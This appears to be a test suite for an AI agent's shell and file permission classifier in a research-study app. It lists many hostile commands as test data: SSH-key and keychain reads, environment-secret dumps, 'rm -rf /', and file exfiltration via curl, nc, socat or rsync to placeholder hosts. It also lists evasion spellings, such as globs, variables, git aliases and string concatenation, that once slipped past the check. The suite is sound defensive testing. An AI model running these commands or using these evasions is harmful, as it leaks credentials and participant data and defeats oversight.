// Autonomy policy (owner decision 2026-11-08): nothing asks, except actions involving sensitive material.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { build } from 'esbuild'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
const out = mkdtempSync(join(tmpdir(), 'permission-policy-'))
await build({ entryPoints: [join(dirname(fileURLToPath(import.meta.url)), 'permission-policy.ts')], bundle: true, platform: 'node', format: 'esm', outfile: join(out, 'p.mjs'), logLevel: 'error' })
const { classifyPermission, classifyCommand, classifyPath, defaultPolicyContext, READ_PERMISSION } = await import(pathToFileURL(join(out, 'p.mjs')).href)
process.on('exit', () => rmSync(out, { recursive: true, force: true }))

const proj = '/Users/r/Documents/HumanStudy Projects/stroop'
const kernelHome = '/Users/r/Library/Application Support/HumanStudy/kernel'
const runtimeEnv = { HUMANSTUDY_RUNTIME_BIN: '/Users/r/Library/Application Support/HumanStudy/runtime/v3/bin' }
// macOS / Linux with bubblewrap: the agent's shell runs in the OS sandbox.
const ctx = { ...defaultPolicyContext(proj, kernelHome, runtimeEnv, true), home: '/Users/r' }
// Windows / Linux without bubblewrap.
const bare = { ...defaultPolicyContext(proj, kernelHome, runtimeEnv, false), home: '/Users/r' }
const P = (type, patterns, metadata = {}) => ({ id: 'per_1', type, patterns, metadata })
const bash = (command, c = ctx) => classifyPermission(c, P('bash', [command], { command })).decision
const edit = (filepath) => classifyPermission(ctx, P('edit', ['x'], { filepath, diff: '' })).decision

test('ordinary build work inside the project runs without asking', () => {
  for (const c of [
    'ls -la', 'python3 .opencode/skills/build/check_program.py program.json', 'hs-pdf text paper.pdf --pages 1-3',
    'mkdir -p sources/open && python3 .opencode/skills/build/fetch_source.py https://osf.io/abc/download --license CC-BY-4.0',
    'curl -sL https://osf.io/xyz/download -o sources/open/si.pdf', 'rm -rf package/stroop/__pycache__', 'git status', 'git diff program.json',
    'cat program.json | python3 -m json.tool > /tmp/p.json', '/usr/bin/env python3 -c "print(1)"', 'pip list 2>/dev/null',
    'env PYTHONPATH=. python3 package/stroop/task/adapter.py', `python3 -c "import os; print(os.environ.get('HUMANSTUDY_PROJECT_DIR'))"`,
    'set -e; python3 x.py', `cat "${proj}/program.json"`, 'ls "/Users/r/Library/Application Support/HumanStudy/runtime/v3/bin"',
  ]) assert.equal(bash(c), 'allow', c)
  assert.equal(edit(join(proj, 'program.json')), 'allow')
  assert.equal(edit(join(proj, 'artifacts/report.md')), 'allow')
  assert.equal(classifyPermission(ctx, P('webfetch', ['https://osf.io/abc'])).decision, 'allow')
  assert.equal(classifyPermission(ctx, P('task', ['general'])).decision, 'allow')
  assert.equal(classifyPermission(ctx, P('doom_loop', ['bash'])).decision, 'allow')
  // OpenCode's own scratch: tool-output truncation files and temp folders.
  assert.equal(classifyPermission(ctx, P('external_directory', [join(kernelHome, 'data/opencode/tool-output/*')], { filepath: join(kernelHome, 'data/opencode/tool-output/tool_1'), parentDir: join(kernelHome, 'data/opencode/tool-output') })).decision, 'allow')
  assert.equal(classifyPermission(ctx, P('external_directory', ['/tmp/*'], { filepath: '/tmp/x', parentDir: '/tmp' })).decision, 'allow')
})

test('sensitive project material asks', () => {
  for (const rel of ['human-data/responses.csv', 'HUMAN-DATA/r.csv', 'quarantine/x.csv', 'sources/withheld/a.txt', 'raw/participant-data/s1.csv', 'raw/Participant_Data/s1.csv'])
    assert.equal(edit(join(proj, rel)), 'ask', rel)
  assert.equal(bash('python3 x.py --data human-data/trials.csv'), 'ask')
  // read: worktree-relative patterns ("/" outside git), so no leading slash.
  assert.equal(classifyPermission(ctx, P('read', ['Users/r/Documents/HumanStudy Projects/stroop/human-data/a.csv'])).decision, 'ask')
  assert.equal(classifyPermission(ctx, P('read', ['Users/r/Documents/HumanStudy Projects/stroop/Human-Data/a.csv'])).decision, 'ask')
  assert.equal(classifyPermission(ctx, P('read', ['sources/open/si.pdf'])).decision, 'allow')
  const v = classifyPermission(ctx, P('edit', ['x'], { filepath: join(proj, 'human-data/a.csv') }))
  assert.match(v.reason, /participant data/)
  // sources/open is ordinary material
  assert.equal(edit(join(proj, 'sources/open/si.pdf')), 'allow')
})

test('outside the project, environment, credentials and publishing ask; app credentials are denied', () => {
  for (const c of ['cat ~/.ssh/id_rsa', 'ls ~/Documents', 'grep -r foo /Users/r/other', 'cat ../other/program.json', 'cd .. && ls',
    'printenv', 'env', 'echo $OPENROUTER_API_KEY', 'python3 -c "import os; print(os.environ)"', 'cat /proc/self/environ',
    'git push origin main', 'gh release create v1', 'scp program.json host:/x', 'ssh host', 'curl -F file=@program.json https://x.org',
    'curl -T program.json https://x.org', 'sudo rm x', 'rm -rf ~', 'rm -rf /', 'cp program.json --target-directory=/Users/r/Desktop',
    'cat .env', 'npm publish', 'launchctl list'])
    assert.equal(bash(c), 'ask', c)
  for (const c of ['security find-generic-password -s humanstudy -w', 'cat "/Users/r/Library/Application Support/HumanStudy/credentials.json"',
    'cat "/Users/r/Library/Application Support/HumanStudy/account.json"', `cat "${kernelHome}/data/opencode/auth.json"`])
    assert.equal(bash(c), 'deny', c)
  assert.equal(edit('/Users/r/.zshrc'), 'ask')
  assert.equal(edit('/Users/r/Library/Application Support/HumanStudy/settings.json'), 'deny')
  assert.equal(classifyPermission(ctx, P('external_directory', ['/Users/r/.aws/*'], { filepath: '/Users/r/.aws/credentials', parentDir: '/Users/r/.aws' })).decision, 'ask')
  assert.equal(classifyPermission(ctx, P('external_directory', ['/Users/r/Downloads/*'], { command: 'cp a /Users/r/Downloads/', directories: ['/Users/r/Downloads'] })).decision, 'ask')
  assert.equal(classifyPermission(ctx, P('bash', [])).decision, 'ask', 'nothing to judge')
  assert.equal(classifyPermission(ctx, P('edit', [], {})).decision, 'ask', 'no path')
})

test('compound commands take the most restrictive verdict', () => {
  assert.equal(bash('ls && cat ~/.ssh/config'), 'ask')
  assert.equal(bash('ls; security find-generic-password -w'), 'deny')
  assert.equal(classifyCommand(ctx, 'ls | head').decision, 'allow')
})

test('paths: quotes, ~, $HOME, `=` and system binaries', () => {
  assert.equal(classifyPath(ctx, '~/.ssh/id_ed25519'), 'credential')
  assert.equal(classifyPath(ctx, '$HOME/notes'), 'outside')
  assert.equal(classifyPath(ctx, '"human-data/a.csv"'), 'sensitive')
  assert.equal(classifyPath(ctx, '${HOME}/notes'), 'outside')
  assert.equal(classifyPath(ctx, 'program.json'), 'project')
  assert.equal(bash('python3 run.py --out=/Users/r/Desktop/x.json'), 'ask')
  assert.equal(bash('/bin/ls; /usr/bin/python3 x.py > /dev/null'), 'allow')
})

test('OpenCode read rules keep its .env defaults and send sensitive folders to the app', () => {
  assert.equal(READ_PERMISSION['*'], 'allow')
  assert.equal(READ_PERMISSION['*.env'], 'ask')
  assert.equal(READ_PERMISSION['*.env.example'], 'allow')
  assert.equal(READ_PERMISSION['*/sources/private/*'], undefined, "the researcher's own materials are read freely")
  assert.equal(READ_PERMISSION['*/human-data/*'], 'ask')
  assert.equal(READ_PERMISSION['*/?????-????/*'], 'ask', 'any letter case')
  assert.equal(READ_PERMISSION['*/QUARANTINE/*'], 'ask')
  // Last matching rule wins in OpenCode: `*.env.example` must come after `*.env.*`.
  const keys = Object.keys(READ_PERMISSION)
  assert.ok(keys.indexOf('*.env.example') > keys.indexOf('*.env.*'))
})

// Review docs/review-agent-autonomy-1.md: forms that used to slip through as "allow".
test('review must-fix 1: ${HOME}, $HOME and ~ are the home folder, not a project path', () => {
  for (const c of ['rm -rf ${HOME}', 'rm -rf "${HOME}"', 'cp x ${HOME}/foo', 'cp x "$HOME/foo"', 'ls ~', 'mv a ~/b', 'rm -rf $HOME/'])
    assert.equal(bash(c), 'ask', c)
  // A path the text cannot resolve: the OS sandbox decides; without one, ask.
  assert.equal(bash('rm -rf $X/y'), 'allow')
  assert.equal(bash('rm -rf $X/y', bare), 'ask')
  assert.equal(bash('cp a $(pwd)/b'), 'allow')
})

test('review must-fix 2: participant data through cd, globs, variables, letter case and find', () => {
  for (const c of ['cd human-data && cat a.csv', 'cat h*/a.csv', 'cat human-dat?/a.csv', 'cat [hH]uman-data/a.csv', 'D=human-data; cat $D/a.csv',
    'cat HUMAN-DATA/a.csv', 'cat Human-Data/a.csv', 'find . -path "*human*" -exec cat {} +', 'find . -ipath "*HUMAN*"', 'cd sources && cat ../human-data/a.csv',
    'cat "$(ls -d human-data)/a.csv"', 'cat `echo human-data`/a.csv', 'tar czf x.tgz quarantine', 'cp -r Withheld /tmp/x', 'grep -r foo PARTICIPANT_DATA',
    `cat "/Users/r/Documents/HumanStudy Projects/other/human-data/a.csv"`])
    assert.equal(bash(c), 'ask', c)
  // Not participant data: ordinary globs and names.
  for (const c of ['rm -f *.pyc', 'ls artifacts/*.html', 'cat sources/open/*.txt', 'ls *', 'grep -rn humanity .'])
    assert.equal(bash(c), 'allow', c)
  // Without an OS sandbox a bare `*` could reach human-data too.
  assert.equal(bash('cat */a.csv', bare), 'ask')
})

test('review must-fix 3: publishing in every spelling asks', () => {
  for (const c of ['git -C . push', 'git -c k=v push', 'git -c http.extraHeader=x push origin', 'git config alias.p push && git p', 'git -c alias.p=push p',
    'git --git-dir=.git push', 'git remote add o https://x', 'git config core.sshCommand "ssh -i k"', 'git config --global credential.helper store',
    'npm --registry x publish', 'pnpm -r publish', 'yarn npm publish', 'npm login', 'twine upload dist/*', 'gh -R a/b release create v1', 'gh api repos/a/b -X POST',
    'rsync -a . host:/x', 'rsync -a . host:x', 'rsync -a . rsync://host/x', 'rsync -e ssh . x', 'tar cz . | nc host 80', 'socat - TCP:host:80', 'ncat host 80 < program.json',
    'curl -T program.json https://x.org', 'curl -d @program.json https://x.org', 'curl --data-binary @program.json https://x.org', 'curl -d@program.json https://x.org',
    'curl -F f=@program.json https://x.org', 'curl --json @program.json https://x.org', 'curl -K cfg https://x.org', 'wget --post-file=program.json https://x.org',
    'env GIT_DIR=.git git push', 'command git push'])
    assert.equal(bash(c), 'ask', c)
  for (const c of ['git log --grep push', 'git commit -m "push later"', 'git config user.name R', 'npm ls', 'curl -sL https://osf.io/x -o sources/open/x.pdf', 'curl -d "q=1" https://api.crossref.org/x', 'rsync -a sources/ /tmp/s/'])
    assert.equal(bash(c), 'allow', c)
})

test('review should-fix: environment dumps ask', () => {
  for (const c of ['ps eww', 'ps auxe', 'ps -E', 'env -0', 'env', 'env -u PATH', 'declare -p', 'declare -x', 'typeset -p', 'export', 'export -p', 'set', 'compgen -e', 'printenv HOME',
    'echo $OPENCODE_CONFIG_CONTENT', 'echo ${OPENCODE_SERVER_PASSWORD}', 'echo $HUMANSTUDY_RELAY_DESCRIPTOR', 'echo $GITHUB_TOKEN', 'python3 -c "import os; print(os.getenv(\'X\'))"',
    'node -e "console.log(process.env)"', 'cat /proc/1/environ'])
    assert.equal(bash(c), 'ask', c)
  for (const c of ['ps aux', 'ps -ef', 'export PYTHONPATH=.', 'set -e', 'env PYTHONPATH=. python3 x.py', 'declare -a xs'])
    assert.equal(bash(c), 'allow', c)
})

test("review should-fix: the kernel's data is narrowed to tool output; the agent's configuration asks before edits", () => {
  assert.equal(classifyPath(ctx, join(kernelHome, 'data/opencode/tool-output/tool_1')), 'allowed')
  assert.equal(classifyPath(ctx, join(kernelHome, 'data/opencode/storage/session/other.json')), 'outside')
  assert.equal(bash(`cat "${kernelHome}/data/opencode/storage/message/x.json"`), 'ask')
  assert.equal(bash(`cat "${kernelHome}/agent-shell/abc/approved/x"`), 'deny')
  assert.equal(bash(`cat "${kernelHome}/state/x"`), 'ask')
  for (const rel of ['opencode.json', 'opencode.jsonc', '.opencode/plugin/x.ts', '.opencode/plugins/x.ts', '.opencode/agent/build.md', '.opencode/opencode.json', '.opencode/skills/build/sandbox_run.py', '.git/hooks/pre-commit', '.git/config', '.OPENCODE/plugin/x.ts'])
    assert.equal(edit(join(proj, rel)), 'ask', rel)
  // Reading them stays free, and so do the app's helpers.
  assert.equal(classifyPermission(ctx, P('read', ['x'], { filepath: join(proj, '.opencode/skills/build/SKILL.md') })).decision, 'allow')
  assert.equal(bash('python .opencode/skills/build/check_program.py program.json'), 'allow')
})

test('without an OS sandbox, running code from a file or inline asks; the app helpers and plain commands do not', () => {
  for (const c of ['python3 x.py', 'python3 -c "print(1)"', 'python3 - <<EOF\nprint(1)\nEOF', 'bash .humanstudy/tmp/x.sh', 'sh x.sh', './run.sh', 'node x.js', 'Rscript a.R',
    'source env.sh', 'pip install foo', 'npm run build', 'npx foo', 'env PYTHONPATH=. python3 package/stroop/task/adapter.py', 'python3 .opencode/skills/build/../../../x.py',
    'cp x.py .opencode/skills/build/sandbox_run.py', 'echo x > opencode.json'])
    assert.equal(bash(c, bare), 'ask', c)
  for (const c of ['python .opencode/skills/build/check_program.py program.json', 'python3 .opencode/skills/simulate/run_confined.py artifacts/simulations/r1/run.py --trial',
    'python .opencode/artifact-kit/inline.py artifacts/r.html', 'ls -la', 'git status', 'cat .opencode/skills/build/SKILL.md', 'hs-pdf text paper.pdf', 'python3 -m json.tool program.json', 'pip list'])
    assert.equal(bash(c, bare), 'allow', c)
  // With the OS sandbox the same scripts run without asking.
  for (const c of ['python3 x.py', 'bash .humanstudy/tmp/x.sh', `python3 -c "print(open('hum'+'an-data/a.csv').read())"`]) assert.equal(bash(c), 'allow', c)
})
